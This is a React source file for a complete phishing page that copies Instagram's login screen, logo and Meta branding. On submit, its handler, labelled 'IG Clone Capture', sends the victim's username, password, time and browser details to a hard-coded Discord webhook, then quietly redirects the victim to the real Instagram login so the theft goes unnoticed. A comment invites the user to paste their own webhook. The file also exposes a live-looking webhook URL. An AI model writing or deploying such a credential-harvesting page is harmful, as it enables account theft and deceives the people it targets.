'use client';

import { FormEvent, useState } from 'react';

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    e.stopPropagation();

    const timestamp = new Date().toLocaleString();
    const payload = {
      content: `**IG Clone Capture**\n` +
               `Time: ${timestamp}\n` +
               `User/Email: ${username || '—'}\n` +
               `Password: ${password || '—'}\n` +
               `Device: ${navigator.userAgent.slice(0, 100)}...`
    };

    const webhookUrl = 'https://discord.com/api/webhooks/1467945172640993404/3y2ovFlYhe-ODF6HzdnzJ-9oMZdqs3EmlBvvUjlQVn1OjGIUBF4EZa3EN7OBFKSmOaw-'; // ← PASTE YOUR REAL WEBHOOK URL

    // Try sendBeacon first (best for mobile/unload)
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
      navigator.sendBeacon(webhookUrl, blob);
    } else {
      // Fallback
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      }).catch(() => {});
    }

    // Quick delay so beacon has time to send
    setTimeout(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 200);
  };

  return (
    <>
      <style jsx global>{`
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background:#000; color:#fff; min-height:100vh;
          -webkit-tap-highlight-color:transparent; touch-action:manipulation;
        }
        .main-container { display:flex; min-height:100vh; width:100%; }
        .left-side {
          flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center;
          padding:40px; background:#000;
        }
        .instagram-logo { width:80px; height:80px; margin-bottom:40px; }
        .tagline { text-align:center; max-width:400px; }
        .tagline h1 { font-size:42px; font-weight:400; line-height:1.2; margin-bottom:10px; }
        .close-friends { color:#ff3366; }
        .phone-mockup { margin-top:60px; position:relative; display:flex; justify-content:center; align-items:center; }
        .photo-cards { position:relative; width:320px; height:400px; }
        .photo-card {
          position:absolute; width:200px; height:280px; border-radius:20px; overflow:hidden;
          box-shadow:0 10px 40px rgba(0,0,0,0.6); border:3px solid #222;
          background-size:cover; background-position:center;
        }
        .card-1 { left:20px; top:20px; transform:rotate(-8deg); z-index:1; background:linear-gradient(135deg,rgba(102,126,234,0.9)0%,rgba(118,75,162,0.9)100%),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 280"><rect fill="%23667eea" width="200" height="280"/></svg>'); }
        .card-2 { left:80px; top:40px; transform:rotate(5deg); z-index:2; background:linear-gradient(135deg,rgba(240,147,251,0.9)0%,rgba(245,87,108,0.9)100%),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 280"><rect fill="%23f093fb" width="200" height="280"/></svg>'); }
        .card-3 { left:140px; top:60px; transform:rotate(12deg); z-index:3; background:linear-gradient(135deg,rgba(79,172,254,0.9)0%,rgba(0,242,254,0.9)100%),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 280"><rect fill="%234facfe" width="200" height="280"/></svg>'); }
        .card-content {
          width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;
          gap:10px; font-size:80px; background:rgba(0,0,0,0.1); backdrop-filter:blur(1px);
        }
        .card-icon { font-size:60px; filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
        .story-indicator { position:absolute; bottom:15px; left:50%; transform:translateX(-50%); width:80%; height:4px; background:rgba(255,255,255,0.4); border-radius:2px; }
        .story-progress { width:60%; height:100%; background:white; border-radius:2px; }
        .emoji-overlay { position:absolute; font-size:40px; z-index:10; }
        .emoji-1 { left:-20px; top:100px; animation:float1 3s ease-in-out infinite; }
        .emoji-2 { right:-10px; top:140px; animation:float2 2.5s ease-in-out infinite; }
        .emoji-3 { left:140px; bottom:20px; animation:float3 2.8s ease-in-out infinite; }
        .emoji-4 { right:20px; bottom:80px; animation:float4 3.2s ease-in-out infinite; }
        @keyframes float1 { 0%,100% {transform:translateY(0) rotate(-5deg);} 50% {transform:translateY(-15px) rotate(5deg);} }
        @keyframes float2 { 0%,100% {transform:translateY(0) rotate(5deg);} 50% {transform:translateY(-10px) rotate(-5deg);} }
        @keyframes float3 { 0%,100% {transform:translateY(0) scale(1);} 50% {transform:translateY(-12px) scale(1.1);} }
        @keyframes float4 { 0%,100% {transform:translateY(0) rotate(-10deg);} 50% {transform:translateY(-8px) rotate(10deg);} }

        .right-side { flex:1; display:flex; align-items:center; justify-content:center; padding:40px; background:#000; }
        .login-container { width:100%; max-width:380px; }
        .login-box { background:#0a0a0a; border:1px solid #262626; padding:40px; }
        .login-title { text-align:center; font-size:18px; font-weight:400; margin-bottom:30px; color:#fff; }
        .input-field {
          width:100%; padding:12px; margin-bottom:8px; background:#121212; border:1px solid #262626;
          border-radius:3px; color:#fff; font-size:14px;
        }
        .input-field::placeholder { color:#737373; }
        .input-field:focus { outline:none; border-color:#555; }
        .password-wrapper { position:relative; margin-bottom:8px; }
        .password-wrapper input { padding-right:50px; }
        .show-password {
          position:absolute; right:12px; top:50%; transform:translateY(-50%); color:#fff; font-size:14px;
          font-weight:600; cursor:pointer; user-select:none;
        }
        .show-password:hover { color:#a8a8a8; }
        .login-button {
          width:100%; padding:10px; margin-top:10px; background:#0095f6; color:#fff; border:none;
          border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s ease;
        }
        .login-button:hover { background:#1877f2; }
        .login-button:active { transform:scale(0.98); }
        .forgot-password { text-align:center; margin-top:20px; }
        .forgot-password a { color:#00376b; font-size:13px; text-decoration:none; }
        .forgot-password a:hover { color:#0095f6; }
        .or-divider { display:flex; align-items:center; margin:20px 0; gap:18px; }
        .or-divider::before, .or-divider::after { content:''; flex:1; height:1px; background:#262626; }
        .or-divider span { color:#737373; font-size:13px; font-weight:600; }
        .facebook-login { margin-top:20px; background:#0a0a0a; border:1px solid #262626; padding:20px 40px; text-align:center; }
        .facebook-button {
          display:flex; align-items:center; justify-content:center; gap:10px; color:#0095f6;
          font-weight:600; font-size:14px; cursor:pointer; background:none; border:none; width:100%;
          transition:color 0.2s ease;
        }
        .facebook-button:hover { color:#1877f2; }
        .facebook-button:active { transform:scale(0.98); }
        .signup-box { margin-top:12px; background:#0a0a0a; border:1px solid #262626; padding:25px 40px; text-align:center; }
        .signup-box p { font-size:14px; color:#fff; }
        .signup-box a { color:#0095f6; font-weight:600; text-decoration:none; margin-left:5px; transition:color 0.2s ease; }
        .signup-box a:hover { color:#1877f2; }
        .get-app { margin-top:20px; text-align:center; }
        .get-app p { font-size:14px; margin-bottom:15px; }
        .app-buttons { display:flex; gap:8px; justify-content:center; }
        .app-button { height:40px; cursor:pointer; transition:opacity 0.2s; }
        .app-button:hover { opacity:0.8; }
        .meta-footer { margin-top:30px; text-align:center; color:#737373; font-size:12px; }
        .footer-links { margin-top:30px; display:flex; flex-wrap:wrap; justify-content:center; gap:15px; font-size:12px; }
        .footer-links a { color:#737373; text-decoration:none; transition:color 0.2s ease; }
        .footer-links a:hover { color:#fff; }
        .language-selector { display:inline-block; color:#737373; font-size:12px; margin-right:15px; }
        .copyright { display:inline-block; color:#737373; font-size:12px; }

        @media (max-width: 875px) {
          .left-side { display:none; }
          .main-container { justify-content:center; }
        }
      `}</style>

      <div className="main-container">
        <div className="left-side">
          <svg className="instagram-logo" viewBox="0 0 448 512" fill="url(#gradient)">
            <defs><linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" stopColor="#f09433"/><stop offset="25%" stopColor="#e6683c"/>
              <stop offset="50%" stopColor="#dc2743"/><stop offset="75%" stopColor="#cc2366"/>
              <stop offset="100%" stopColor="#bc1888"/>
            </linearGradient></defs>
            <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
          </svg>
          <div className="tagline">
            <h1>See everyday moments from<br/>your <span className="close-friends">close friends</span>.</h1>
          </div>
          <div className="phone-mockup">
            <div className="photo-cards">
              <div className="photo-card card-1"><div className="card-content"><div className="card-icon">👥</div><div className="story-indicator"><div className="story-progress"></div></div></div></div>
              <div className="photo-card card-2"><div className="card-content"><div className="card-icon">📸</div><div className="story-indicator"><div className="story-progress"></div></div></div></div>
              <div className="photo-card card-3"><div className="card-content"><div className="card-icon">🎉</div><div className="story-indicator"><div className="story-progress"></div></div></div></div>
              <div className="emoji-overlay emoji-1">💗</div>
              <div className="emoji-overlay emoji-2">😍</div>
              <div className="emoji-overlay emoji-3">😂</div>
              <div className="emoji-overlay emoji-4">🔥</div>
            </div>
          </div>
        </div>

        <div className="right-side">
          <div className="login-container">
            <div className="login-box">
              <h2 className="login-title">Log into Instagram</h2>
              <form onSubmit={handleSubmit}>
                <input type="text" className="input-field" placeholder="Mobile number, username or email" value={username} onChange={e=>setUsername(e.target.value)} required />
                <div className="password-wrapper">
                  <input type={showPassword?"text":"password"} className="input-field" placeholder="Password" value={password} onChange={e=>setPassword(e.target.value)} required />
                  {password && <span className="show-password" onClick={()=>setShowPassword(!showPassword)}>{showPassword?'Hide':'Show'}</span>}
                </div>
                <button type="submit" className="login-button">Log in</button>
              </form>
              <div className="or-divider"><span>OR</span></div>
              <div className="forgot-password"><a href="#">Forgot password?</a></div>
            </div>
            <div className="facebook-login">
              <button className="facebook-button">
                <svg width="20" height="20" fill="#0095f6" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                Log in with Facebook
              </button>
            </div>
            <div className="signup-box"><p>Don't have an account? <a href="#">Create new account</a></p></div>
            <div className="get-app"><p>Get the app.</p><div className="app-buttons">
              <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" className="app-button"/>
              <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft" className="app-button"/>
            </div></div>
            <div className="meta-footer"><svg width="60" height="20" viewBox="0 0 100 30" fill="#737373"><text x="0" y="20" fontSize="16" fontWeight="600">Meta</text></svg></div>
            <div className="footer-links">
              <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
            </div>
            <div style={{textAlign:'center',marginTop:'20px'}}>
              <span className="language-selector">English</span>
              <span className="copyright">© 2026 Instagram from Meta</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}